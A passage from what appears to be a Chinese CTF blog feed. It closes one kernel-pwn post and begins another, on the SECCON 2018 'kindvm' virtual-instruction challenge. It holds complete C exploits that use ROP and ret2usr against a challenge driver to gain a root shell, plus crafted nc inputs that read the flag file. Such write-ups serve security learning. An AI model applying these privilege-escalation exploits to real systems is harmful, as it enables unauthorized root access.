buf);</span><br><span class="line"><span class="keyword">size_t</span> offset = ((<span class="keyword">size_t</span> *)buf)[<span class="number">8</span>] - <span class="number">0xc2d84</span> - raw_vmlinux_base;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]offset: %p\n"</span>, offset);</span><br><span class="line"><span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">40</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]canary: %p\n"</span>, canary);</span><br><span class="line">commit_creds += offset;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]commit_creds: %p\n"</span>, commit_creds);</span><br><span class="line">prepare_kernel_cred += offset;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]prepare_kernel_cred: %p\n"</span>, prepare_kernel_cred);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff8109054d</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81083f22</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81006ffc</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810def79</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff810636b4</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81478294</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line">baby_write(fd, rop);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img alt="" data-src="/2020/04/16/kernel-pwn-one/2.png" class="lazyload"></p><h4 id="exp2-ret2usr"><a href="#exp2-ret2usr" class="headerlink" title="exp2(ret2usr)"></a>exp2(ret2usr)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></span><br><span class="line">typedef int __attribute__((regparm(<span class="number">3</span>))) (*_commit_creds)(unsigned long cred);</span><br><span class="line">typedef unsigned long __attribute__((regparm(<span class="number">3</span>))) (*_prepare_kernel_cred)(unsigned long cred);</span><br><span class="line">_commit_creds commit_creds =<span class="number">0xffffffff810a1430</span>;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred =<span class="number">0xffffffff810a1820</span>;</span><br><span class="line">void spawn_shell()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!getuid())</span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">puts(<span class="string">"[*]spawn shell error!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* size_t commit_creds = <span class="number">0xffffffff810a1430</span>; */</span><br><span class="line">/* size_t prepare_kernel_cred = <span class="number">0xffffffff810a1820</span>; */</span><br><span class="line">size_t raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line">void save_status()</span><br><span class="line">&#123;</span><br><span class="line">__asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line"><span class="string">"mov user_ss, ss;"</span></span><br><span class="line"><span class="string">"mov user_sp,rsp;"</span></span><br><span class="line"><span class="string">"pushf;"</span></span><br><span class="line"><span class="string">"pop user_rflags;"</span></span><br><span class="line">   );</span><br><span class="line">puts(<span class="string">"[*]status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void set_buffersize(int fd, int idx)</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"[*]set buffersize to %d\n"</span>,idx);</span><br><span class="line">ioctl(fd, <span class="number">0x30000</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void baby_read(int fd, char *buf)</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"[*]read to buf.\n"</span>);</span><br><span class="line">ioctl(fd, <span class="number">0x30002</span>, buf);</span><br><span class="line">printf(<span class="string">"[+]read to buf success!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void baby_write(int fd, char *buf)</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"[*]copy from user.\n"</span>);</span><br><span class="line">ioctl(fd,<span class="number">0x30001</span>, buf);</span><br><span class="line">printf(<span class="string">"[+]copy from user success!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_root()</span><br><span class="line">&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">save_status();</span><br><span class="line">int fd = open(<span class="string">"/dev/babyhacker"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">puts(<span class="string">"[*]open /dev/babyhacker error!"</span>);</span><br><span class="line">exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_buffersize(fd, <span class="number">0x80000200</span>);</span><br><span class="line"></span><br><span class="line">char buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">baby_read(fd, buf);</span><br><span class="line">size_t offset = ((size_t *)buf)[<span class="number">8</span>] - <span class="number">0xc2d84</span> - raw_vmlinux_base;</span><br><span class="line">printf(<span class="string">"[+]offset: %p\n"</span>, offset);</span><br><span class="line">size_t canary = ((size_t *)buf)[<span class="number">40</span>];</span><br><span class="line">printf(<span class="string">"[+]canary: %p\n"</span>, canary);</span><br><span class="line">commit_creds += offset;</span><br><span class="line">printf(<span class="string">"[+]commit_creds: %p\n"</span>, commit_creds);</span><br><span class="line">prepare_kernel_cred += offset;</span><br><span class="line">printf(<span class="string">"[+]prepare_kernel_cred: %p\n"</span>, prepare_kernel_cred);</span><br><span class="line"></span><br><span class="line">size_t rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">int i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff8109054d</span> + offset; // pop rdi; ret </span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81004d70</span> + offset; //mov_rc4_pop_ret</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (size_t)get_root;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff810636b4</span> + offset; // swapgs; popfq; ret</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81478294</span> + offset; // iretq; ret; </span><br><span class="line">rop[i++] = (size_t)spawn_shell;         // rip </span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line">baby_write(fd, rop);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img alt="" data-src="/2020/04/16/kernel-pwn-one/3.png" class="lazyload"></p>]]></content>
    
    <summary type="html">
    
      草长莺飞二月天，拂堤杨柳醉春烟
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
      <category term="gxzy" scheme="https://j-kangel.github.io/tags/gxzy/"/>
    
  </entry>
  
  <entry>
    <title>虚拟指令集pwn</title>
    <link href="https://j-kangel.github.io/2020/04/10/%E8%99%9A%E6%8B%9F%E6%8C%87%E4%BB%A4%E9%9B%86pwn/"/>
    <id>https://j-kangel.github.io/2020/04/10/虚拟指令集pwn/</id>
    <published>2020-04-10T10:13:17.000Z</published>
    <updated>2020-04-12T11:30:09.152Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近来很多比赛都有虚拟指令集pwn的题目，漏洞都是常规的漏洞，但是题目还算新颖，有一种计组做实验的感觉。</p><p>这类题目主要就是搞清楚指令集的作用，需要对字节、符号、移位等知识有非常清晰的认识，废话不多说，先来一道题目试试。</p><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><p>来源：<a href="https://github.com/SECCON/SECCON2018_online_CTF/tree/master/Pwn/kindvm" target="_blank" rel="noopener">seccon-2018-kindvm</a></p><p>checksec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/shared/vmpwn/kindvm/kindvm&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>静态分析，程序流程如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ctf_setup();       <span class="comment">//初始化设置</span></span><br><span class="line">  kindvm_setup();    <span class="comment">//设置虚拟指令集</span></span><br><span class="line">  input_insn();      <span class="comment">//输入指令</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">void</span>))(kc + <span class="number">16</span>))();   <span class="comment">//执行某个函数</span></span><br><span class="line">  <span class="keyword">while</span> ( !*(_DWORD *)(kc + <span class="number">4</span>) )     <span class="comment">//当kc+4为true时终止执行</span></span><br><span class="line">    exec_insn();     <span class="comment">//执行指令</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">void</span>))(kc + <span class="number">20</span>))();   <span class="comment">//执行某个函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点关注kindvm_setup()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kindvm_setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">0x18</span>u);</span><br><span class="line">  kc = (<span class="keyword">int</span>)v0;</span><br><span class="line">  *v0 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(kc + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  v1 = kc;</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">8</span>) = input_username(); <span class="comment">//输入name,溢出会执行hint1()</span></span><br><span class="line">  *(_DWORD *)(kc + <span class="number">12</span>) = <span class="string">"banner.txt"</span>;</span><br><span class="line">  *(_DWORD *)(kc + <span class="number">16</span>) = func_greeting;  <span class="comment">//执行指令前的函数</span></span><br><span class="line">  *(_DWORD *)(kc + <span class="number">20</span>) = func_farewell;  <span class="comment">//执行指令后的函数</span></span><br><span class="line">  mem = <span class="built_in">malloc</span>(<span class="number">0x400</span>u);     <span class="comment">//内存在堆上</span></span><br><span class="line">  <span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  reg = <span class="built_in">malloc</span>(<span class="number">0x20</span>u);      <span class="comment">//寄存器也在堆上</span></span><br><span class="line">  <span class="built_in">memset</span>(reg, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  insn = <span class="built_in">malloc</span>(<span class="number">0x400</span>u);    <span class="comment">//存放指令也在堆上</span></span><br><span class="line">  result = <span class="built_in">memset</span>(mem, <span class="string">'A'</span>, <span class="number">0x400</span>u);</span><br><span class="line">  func_table[<span class="number">0</span>] = (<span class="keyword">int</span>)insn_nop;</span><br><span class="line">  dword_804B0C4 = (<span class="keyword">int</span>)insn_load;  <span class="comment">//0x01 + 寄存器号（0-7）+ 内存地址（2字节，小于0x3fc）</span></span><br><span class="line">  dword_804B0C8 = (<span class="keyword">int</span>)insn_store; <span class="comment">//0x02 + 内存地址（2字节，小于0x3fc) + 寄存器号（0-7）</span></span><br><span class="line">  dword_804B0CC = (<span class="keyword">int</span>)insn_mov;   <span class="comment">//0x03 + 寄存器号a + 寄存器号b ;a = b</span></span><br><span class="line">  dword_804B0D0 = (<span class="keyword">int</span>)insn_add;   <span class="comment">//0x04 + 寄存器号a + 寄存器号b a+=b a如果小于0，那么执行hint3()</span></span><br><span class="line">  dword_804B0D4 = (<span class="keyword">int</span>)insn_sub;   <span class="comment">//0x05 + 寄存器号a + 寄存器号b a-=b</span></span><br><span class="line">  dword_804B0D8 = (<span class="keyword">int</span>)insn_halt;  <span class="comment">//0x06 设置kc+4 = 1   终止执行</span></span><br><span class="line">  dword_804B0DC = (<span class="keyword">int</span>)insn_in;    <span class="comment">//0x07 + 寄存器号 + 立即数（32位 4字节）将立即数存入寄存器</span></span><br><span class="line">  dword_804B0E0 = (<span class="keyword">int</span>)insn_out;   <span class="comment">//0x08 + 寄存器号 打印寄存器的值</span></span><br><span class="line">  dword_804B0E4 = (<span class="keyword">int</span>)insn_hint;  <span class="comment">//0x09 执行hint2()</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们来看一下hint</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input your name : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"> _   _ _       _   _    ____ _____ _____   _ </span><br><span class="line">| | | (_)_ __ | |_/ |  / ___| ____|_   _| | |</span><br><span class="line">| |_| | | &apos;_ \| __| | | |  _|  _|   | |   | |</span><br><span class="line">|  _  | | | | | |_| | | |_| | |___  | |   |_|</span><br><span class="line">|_| |_|_|_| |_|\__|_|  \____|_____| |_|   (_)</span><br><span class="line">                                             </span><br><span class="line"></span><br><span class="line">Nice try! The theme of this binary is not Stack-Based BOF!</span><br><span class="line">However, your name is not meaningless...</span><br></pre></td></tr></table></figure><p>hint1：name溢出即可，提示name有作用，但不是溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  kindvm socat tcp-l:9999,fork exec:./kindvm</span><br><span class="line"></span><br><span class="line">➜  kindvm echo -e &apos;kangel\n\x09&apos; |nc 127.0.0.1 9999                          </span><br><span class="line">Input your name : Input instruction :  _    _           _                 </span><br><span class="line">| | _(_)_ __   __| |_   ___ __ ___  </span><br><span class="line">| |/ / | &apos;_ \ / _` \ \ / / &apos;_ ` _ \ </span><br><span class="line">|   &lt;| | | | | (_| |\ V /| | | | | |</span><br><span class="line">|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|</span><br><span class="line">                                    </span><br><span class="line">Instruction start!</span><br><span class="line"> _   _ _       _   ____     ____ _____ _____   _ </span><br><span class="line">| | | (_)_ __ | |_|___ \   / ___| ____|_   _| | |</span><br><span class="line">| |_| | | &apos;_ \| __| __) | | |  _|  _|   | |   | |</span><br><span class="line">|  _  | | | | | |_ / __/  | |_| | |___  | |   |_|</span><br><span class="line">|_| |_|_|_| |_|\__|_____|  \____|_____| |_|   (_)</span><br><span class="line">                                                 </span><br><span class="line">Nice try! You can analyze vm instruction and execute it!</span><br><span class="line">Flag file name is &quot;flag.txt&quot;.</span><br></pre></td></tr></table></figure><p>hint2：输入’\x09’，提示filename为”flag.txt”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">_<span class="function">DWORD *<span class="title">insn_add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v1; <span class="comment">// [esp+Ah] [ebp-Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="keyword">load_insn_uint8_t</span>();   <span class="comment">//寄存器a</span></span><br><span class="line">  v2 = <span class="keyword">load_insn_uint8_t</span>();   <span class="comment">//寄存器b</span></span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7u</span> )</span><br><span class="line">    kindvm_abort();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">7u</span> )</span><br><span class="line">    kindvm_abort();</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)reg + v1) &gt;= <span class="number">0</span> )   </span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  result = (<span class="keyword">char</span> *)reg + <span class="number">4</span> * v1;</span><br><span class="line">  *result += *((_DWORD *)reg + v2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (_DWORD *)*((_DWORD *)reg + v1);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt; <span class="number">0</span> )    <span class="comment">//寄存器a为负数</span></span><br><span class="line">      hint3();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此可以先往reg[0]中写入负数，然后 add reg[0], reg[0] </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  kindvm echo -e &apos;kangel\n\x07\x00\xff\xff\xff\xff\x04\x00\x00&apos; |nc 127.0.0.1 9999</span><br><span class="line">Input your name : Input instruction :  _    _           _                 </span><br><span class="line">| | _(_)_ __   __| |_   ___ __ ___  </span><br><span class="line">| |/ / | &apos;_ \ / _` \ \ / / &apos;_ ` _ \ </span><br><span class="line">|   &lt;| | | | | (_| |\ V /| | | | | |</span><br><span class="line">|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|</span><br><span class="line">                                    </span><br><span class="line">Instruction start!</span><br><span class="line"> _   _ _       _   _____    ____ _____ _____   _ </span><br><span class="line">| | | (_)_ __ | |_|___ /   / ___| ____|_   _| | |</span><br><span class="line">| |_| | | &apos;_ \| __| |_ \  | |  _|  _|   | |   | |</span><br><span class="line">|  _  | | | | | |_ ___) | | |_| | |___  | |   |_|</span><br><span class="line">|_| |_|_|_| |_|\__|____/   \____|_____| |_|   (_)</span><br><span class="line">                                                 </span><br><span class="line">Nice try! You can cause Integer Overflow!</span><br><span class="line">The value became minus value. Minus value is important.</span><br></pre></td></tr></table></figure><p>hint3：提示有整数溢出</p><p>我们现在来看一下指令退出后的函数func_farewell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> func_farewell()</span><br><span class="line">&#123;</span><br><span class="line">  open_read_write(*(<span class="keyword">char</span> **)(kc + <span class="number">12</span>));   <span class="comment">//banner.txt</span></span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"Execution is end! Thank you!\n"</span>, <span class="number">0x1D</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>banner.txt和name的地址都存放在堆上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20wx kc - 8</span><br><span class="line">0x804c000:      0x00000000      0x00000021      0x00000000      0x00000000</span><br><span class="line">0x804c010:      0x0804c028      0x080491b2      0x08048f89      0x08048fba</span><br><span class="line">0x804c020:      0x00000000      0x00000011      0x67616c66      0x7478742e</span><br><span class="line">0x804c030:      0x00000000      0x00000409      0x41414141      0x41414141</span><br><span class="line">0x804c040:      0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">pwndbg&gt; x/s 0x0804c028</span><br><span class="line">0x804c028:      &quot;flag.txt&quot;</span><br><span class="line">pwndbg&gt; x/s 0x080491b2</span><br><span class="line">0x80491b2:      &quot;banner.txt&quot;</span><br><span class="line">pwndbg&gt; p/x mem</span><br><span class="line">$3 = 0x804c038</span><br></pre></td></tr></table></figure><p>因此 read <code>name</code> -&gt; write it to <code>banner.txt</code>.即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  kindvm echo -e &apos;flag.txt\n\x01\x07\xff\xd8\x02\xff\xdc\x07\x06&apos; | nc 127.0.0.1 9999                                                  </span><br><span class="line">Input your name : Input instruction :  _    _           _                 </span><br><span class="line">| | _(_)_ __   __| |_   ___ __ ___  </span><br><span class="line">| |/ / | &apos;_ \ / _` \ \ / / &apos;_ ` _ \ </span><br><span class="line">|   &lt;| | | | | (_| |\ V /| | | | | |</span><br><span class="line">|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|</span><br><span class="line">                                    </span><br><span class="line">Instruction start!</span><br><span class="line">SECCON&#123;s7ead1ly_5tep_by_5tep&#125;</span><br><span class="line">Execution is end! Thank you!</span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p=process(<span class="string">'./kindvm'</span>)</span><br><span 